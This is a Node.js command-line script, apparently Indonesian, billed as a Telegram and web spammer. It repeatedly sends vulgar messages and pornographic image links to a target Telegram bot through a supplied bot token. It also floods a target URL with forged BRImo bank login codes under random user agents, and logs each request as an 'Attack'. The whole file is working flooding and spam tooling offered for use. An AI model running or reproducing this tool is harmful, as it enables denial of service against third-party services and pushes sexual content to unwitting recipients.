const XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
const axios = require('axios');
const randomUseragent = require('random-useragent');
const chalk = require('chalk');
const console = require('console');
const fs = require('fs');
const moment = require('moment');
const argv = require('yargs').argv;


function savetele(x,y){
const data = {
  ID : x,
  TOKEN : y,
  WAKTU : moment().format('YYYY-MM-DD HH:mm:ss') 
};
let jsonData = [];
try {
  jsonData = require('./telebot.json');
} catch (error) {
  // File tidak ditemukan atau kesalahan lainnya
}

jsonData.push(data);
fs.writeFileSync('./telebot.json', JSON.stringify(jsonData, null, 2), 'utf-8');
}

function saveweb(x){
const data = {
  URL : x,
  WAKTU : moment().format('YYYY-MM-DD HH:mm:ss') 
};
let jsonData = [];
try {
  jsonData = require('./web.json');
} catch (error) {
  // File tidak ditemukan atau kesalahan lainnya
}
jsonData.push(data);
fs.writeFileSync('./web.json', JSON.stringify(jsonData, null, 2), 'utf-8');
}


function randompict(){
var a = ['https://cewekgenit.pics/wp-content/uploads/2020/07/Screenshot_68.jpg', 'https://photomemek.com/wp-content/uploads/2022/10/riona-suzuki-5-768x494.jpg','https://1.bp.blogspot.com/-ZGvSs45thoQ/XvY7Q2uSumI/AAAAAAAABgA/E-hJtpDzMmUN-w4ZrmCCi5ho9O9rmOixACLcBGAsYHQ/s1600/foto-memek-perawan-hot-terbaru-5.jpg','https://1.bp.blogspot.com/-RNZ8sY5inaM/XvY8uc9tdXI/AAAAAAAABgM/v51OQcFL4yETOMsxwIRdJCewwb26xWw4gCLcBGAsYHQ/s1600/foto-memek-perawan-hot-terbaru-6.jpg','https://1.bp.blogspot.com/-2MsZRgPXi0A/XvjcnSY0B_I/AAAAAAAABiA/3PLkJ3MKU0gBDmNJSYMZH4f_Ra-o1VVzQCLcBGAsYHQ/s1600/desahan-cewek-cantik-ngentot-goyang-diatas.jpg' ]
var randomIndex = Math.floor(Math.random() * a.length);
var randomValue = a[randomIndex];
return randomValue
}


function randomText(length) {
  const allowedChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let randomString = '';

  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * allowedChars.length);
    randomString += allowedChars.charAt(randomIndex);
  }

  return randomString;
}

/*RANDOM TEXT GEN*/
var one = randomText(100)
var two = randomText(100)
var three = randomText(100)
var email = randomText(6) + '@gmail.com'

const requestInterval = argv.s// 2 detik
let nomorProses = 1; // Inisialisasi nomor proses





function cekidtoken(){
// Menggunakan yargs untuk mengelola argumen dari baris perintah

// Memeriksa apakah argumen -id dan -token telah disertakan
if (!argv.id || !argv.token) {
  console.error('Error: Arguments -id and -token are required.');
} else {
  // Mendapatkan nilai argumen -id dan -token
  const idValue = argv.id;
  const tokenValue = argv.token;
  console.log('ID Value:', idValue);
  console.log('Token Value:', tokenValue);

  // Lakukan operasi lainnya di sini
}

}



function spamtelebot(){

const id = argv.id
const token = argv.token
const img = randompict()
const url = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${id}&photo=${img}`;
const urltxt = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=DUET_MASUK_KONTOL_JUGA_MASUK`



var txt = new XMLHttpRequest();
  txt.open("GET", urltxt, true);
  txt.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  txt.responType = 'json';
  txt.send();

  txt.onreadystatechange = function () {
    if (txt.readyState === 4) {
      if (txt.status === 200) {
        console.log(
        chalk.cyan(`[ ${nomorProses} ]`),
        chalk.white(' RESPON SERVER TXT '), 
        chalk.green(txt.status + ' OKK'), 
        chalk.white(' •> '), 
        chalk.green('Succes Spam'));
        
      } else if (txt.status == 0) {
        console.log(
        chalk.cyan(`[ ${nomorProses} ]`),
        chalk.white(' RESPON SERVER TXT '), 
        chalk.yellow(txt.status + ' BAD'), 
        chalk.white(' •> '), 
        chalk.red('Server Bussy / Hang Out'));
        
      } else {
        const jsonResponse = JSON.parse(txt.responseText);
        const dsc = jsonResponse.description;
        console.log(
        chalk.cyan(`[ ${nomorProses} ]`),
        chalk.white(' RESPON SERVER TXT '), 
        chalk.yellow(txt.status + ' BAD'), chalk.white(' •> '), 
        chalk.red(dsc));
      }
    }
  };



  var gambar = new XMLHttpRequest();
  gambar.open("GET", url, true);
  gambar.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  gambar.responType = 'json';
  gambar.send();

  gambar.onreadystatechange = function () {
    if (gambar.readyState === 4) {
      if (gambar.status === 200) {
        console.log(
        chalk.cyan(`[ ${nomorProses} ]`),
        chalk.white(' RESPON SERVER IMG '), 
        chalk.green(gambar.status + ' OKK'), 
        chalk.white(' •> '), 
        chalk.green('Succes Spam'));
        nomorProses++;
      } else if (gambar.status == 0) {
        console.log(
        chalk.cyan(`[ ${nomorProses} ]`),
        chalk.white(' RESPON SERVER IMG   '), 
        chalk.yellow(gambar.status + ' BAD'), 
        chalk.white(' •> '), 
        chalk.red('Server Bussy / Hang Out'));
        nomorProses++;
      } else {
        const jsonResponse = JSON.parse(gambar.responseText);
        const dsc = jsonResponse.description;
        console.log(
        chalk.cyan(`[ ${nomorProses} ]`),
        chalk.white(' RESPON SERVER IMG '), 
        chalk.yellow(gambar.status + ' BAD'), chalk.white(' •> '), 
        chalk.red(dsc));
        nomorProses++;
      }
    }
  };

}

function post() {
   const url = argv.url
   const postData = {
 inpsms: 'https://brimo.bri.co.id/app/login?code=' + one
};
  const userAgent = randomUseragent.getRandom();
  const headers = {
    'User-Agent': userAgent,
    'Content-Type': 'application/x-www-form-urlencoded'
  };
  

  axios.post(url, postData, { headers })
    .then(response => {
      if (response.status === 200) {
        process.stdout.write(
          '\r' + // Menghapus karakter sebelumnya
          chalk.cyan(`[Attack ${nomorProses}]`) +
          chalk.white(' Respon Server => ') +
          chalk.green(response.status + ' OK') +
          chalk.white(' •> ') +
          chalk.green('[ SUCCES SEND ]') +
          '                      '
          
        );
        
        nomorProses++;
      }
    })
    .catch(error => {
     if(error.message == 'Client network socket disconnected before secure TLS connection was established'){
      process.stdout.write(
        '\r' + // Menghapus karakter sebelumnya
        chalk.cyan(`[Attack ${nomorProses}]`) +
        chalk.white(' Respon Server => ') +
        chalk.yellow() +
        chalk.white(' •>') +
        chalk.red(` [ CONNECTION ERROR ]`)+
        '                           '       
      );
      nomorProses++;
    }else{
    
      process.stdout.write(
        '\r' + // Menghapus karakter sebelumnya
        chalk.cyan(`[Attack ${nomorProses}]`) +
        chalk.white(' Respon Server => ') +
        chalk.yellow() +
        chalk.white(' •>') +
        chalk.red(` [ ${error.message} ]`) + 
        '                               '        
      );
      nomorProses++;
      }
    });
}


console.clear()



function help(){
const kata = `
Selamat Datang Kawan 

--m      |  method untuk spam atau post [ spam / post ]
--url    |  Url Taget Yang Akan Attack [ xxxx.com/otp.php ]
--id     |  Id Target Telegram Bot 
--token  |  Token Target Telegram Bot
--s      |  Waktu untuk mengirim Spam / Data [ 1000 = 1 Detik ]

Example :

--m spam --id xxx --token xxx -s x

--m post --url xxx.com --s x

©mazlana2023

# JANGAN DISALAHGUNAKAN YA KAWAN #
`
console.log(kata)
}
function banner(metod) {
var kata = `
#################################################
#                                               # 
#          SCRIPT SPAMMER TELGRAM + WEB         # 
#                  BY MAZLANA                   # 
#################################################

• METHOD : ${metod}
• DEBUG :
`
console.log(kata)
}


function pilih(){
   const pilih = argv.m
   if(pilih == 'spam' ){
     if (!argv.id || !argv.token || !argv.s) {
  console.error('Error: Contoh node app.js --m spam --id 1234 --token 66axxx --s 50');
     }else{
      banner('SPAM TELEGRAM BOT')
      savetele(argv.id, argv.token)
      const intervalId = setInterval(spamtelebot, requestInterval);
     }
   } 
   else if (pilih == 'post'){
     if (!argv.url || !argv.s) {
  console.error('Error: Contoh node app.js -m post --url webtarget.com --s 50');
     }else{
     banner('SPAM POST DATA')
     saveweb(argv.url)
     const intervalId = setInterval(post, requestInterval);
     }}
     
     
   else {
   help()
}
}

pilih()